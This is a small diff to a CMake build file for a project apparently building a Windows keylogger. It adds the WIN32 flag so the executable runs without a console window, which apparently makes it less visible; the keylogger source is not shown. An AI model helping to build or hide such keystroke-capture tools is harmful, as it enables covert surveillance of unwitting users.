@@ -5,7 +5,7 @@ set(CMAKE_CXX_STANDARD 11)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
 if (WIN32)
-    add_executable(keylogger windows/klog_main.cpp)
+    add_executable(keylogger WIN32 windows/klog_main.cpp)
     set_property(TARGET keylogger PROPERTY
         MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
     target_link_libraries(keylogger user32)
